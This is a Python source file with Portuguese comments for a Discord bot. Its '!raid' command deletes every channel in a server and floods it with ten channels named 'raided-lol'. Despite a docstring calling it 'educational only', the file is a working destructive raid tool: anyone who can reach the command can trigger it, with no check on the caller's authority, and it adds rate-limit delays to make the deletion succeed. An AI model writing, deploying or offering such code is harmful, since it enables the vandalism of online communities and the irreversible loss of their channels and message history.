import discord
from discord.ext import commands
import asyncio

# Configuração do bot
intents = discord.Intents.default()
intents.message_content = True  # Habilita leitura de mensagens
intents.guilds = True  # Habilita permissões para gerenciar servidores
bot = commands.Bot(command_prefix='!', intents=intents)

# Evento de inicialização
@bot.event
async def on_ready():
    print(f'Bot conectado como {bot.user}')

# Comando de "raid" simulado
@bot.command()
async def raid(ctx):
    """Deleta todos os canais e cria 10 canais 'raided-lol' (apenas para fins educacionais)."""
    guild = ctx.guild  # Obtém o servidor onde o comando foi executado
    
    # Verifica se o bot tem permissões de gerenciamento de canais
    if not ctx.guild.me.guild_permissions.manage_channels:
        await ctx.send("Erro: O bot precisa de permissões de 'Gerenciar Canais'.")
        return
    
    try:
        # Deleta todos os canais
        for channel in guild.channels:
            try:
                await channel.delete()
                print(f"Canal {channel.name} deletado.")
                await asyncio.sleep(1)  # Atraso para evitar limites de taxa
            except Exception as e:
                print(f"Erro ao deletar {channel.name}: {e}")
        
        # Cria 10 canais chamados 'raided-lol'
        for i in range(10):
            await guild.create_text_channel(f'raided-lol-{i+1}')
            print(f"Canal raided-lol-{i+1} criado.")
            await asyncio.sleep(1)  # Atraso para evitar limites de taxa
        
        await ctx.send("Ação concluída: canais deletados e 10 canais 'raided-lol' criados.")
    
    except Exception as e:
        await ctx.send(f"Erro durante a execução: {e}")

# Token do bot (usando variável de ambiente para segurança)
import os
bot.run(os.getenv('DISCORD_TOKEN'))
